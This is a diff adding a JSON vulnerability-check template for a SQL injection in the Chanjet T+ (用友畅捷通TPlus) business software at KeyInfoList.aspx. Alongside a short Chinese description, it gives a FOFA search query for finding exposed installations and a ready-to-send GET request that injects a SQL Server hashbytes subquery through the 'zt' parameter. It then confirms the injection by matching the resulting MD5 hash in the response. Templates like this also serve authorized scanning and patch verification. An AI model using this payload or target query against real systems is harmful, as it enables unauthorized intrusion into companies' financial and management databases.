@@ -1,0 +1,32 @@
+{
+  "product": "用友 畅捷通TPlus",
+  "vul_name": "用友畅捷通TPlus KeyInfoList.aspx SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。畅捷通TPlus KeyInfoList.aspx存在SQL注入漏洞。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"畅捷通-TPlus\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486062&idx=2&sn=734033609e43c27806a2754a4c12a4ef&chksm=974b8769a03c0e7fe12e9dbedd78f5e19804367e6a38f1e6dea528444b70aad476ef119f7f3e&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5','123456')))--+"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
